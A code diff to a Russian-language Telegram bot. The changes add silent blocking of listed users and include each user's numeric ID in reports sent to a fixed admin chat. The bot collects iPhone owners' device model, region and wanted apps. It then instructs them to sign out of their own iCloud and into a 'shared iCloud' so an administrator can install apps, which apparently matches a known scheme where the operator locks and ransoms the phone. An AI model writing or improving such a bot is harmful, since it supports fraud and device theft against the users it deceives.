@@ -36,6 +36,10 @@ def get_id_by_username(username):
 
 @bot.message_handler(content_types=['photo'])
 def receive_screenshot(message):
+    uname = (message.from_user.username or "").lower()
+    if (message.from_user.id in blocked_ids) or (uname and uname in blocked_usernames):
+        return
+
     if message.content_type == 'photo':
         try:
             file_id = message.photo[-1].file_id
@@ -48,6 +52,10 @@ def receive_screenshot(message):
         universal(message)
 
 def get_apps(message):
+    uname = (message.from_user.username or "").lower()
+    if (message.from_user.id in blocked_ids) or (uname and uname in blocked_usernames):
+        return
+    
     user_id = message.chat.id
     markup = types.InlineKeyboardMarkup(row_width=True)
     but1 = types.InlineKeyboardButton(text='Поддержка💬️', callback_data='help')
@@ -57,7 +65,7 @@ def get_apps(message):
     region = data[user_id]['region']
     apps = data[user_id]['apps']
     bot.send_message(user_id, '✨ Готово\nТвоя заявка успешно отправлена ✅\n⏳ В ближайшие минуты с тобой свяжется администратор,\nчтобы помочь установить.')
-    bot.send_message(chat_id=7250450110, text=f"Модель айфона: {model}\nРегион/Страна: {region}\nПришла за: {apps}\nЮзер: @{message.from_user.username}")
+    bot.send_message(chat_id=7250450110, text=f"Модель айфона: {model}\nРегион/Страна: {region}\nПришла за: {apps}\nЮзер: @{message.from_user.username}\nID-типа: {message.from_user.id}")
     bot.send_message(user_id, 
         'Теперь дело за малым! Тебе надо выйти со своего iCloud и зайти на Общий iCloud!\n\n'
         '1. Что такое общий iCloud\n\n'
@@ -178,8 +186,7 @@ def universal(message):
         return
 
     if message.chat.id != 7250450110:
-        bot.send_message(chat_id=7250450110, text=f"💬️Сообщение от @{message.from_user.username}:\n{message.text}")
-
+        bot.send_message(chat_id=7250450110, text=f"💬️Сообщение от @{message.from_user.username} (id: {message.from_user.id}):\n{message.text}")
 
 
 bot.polling()
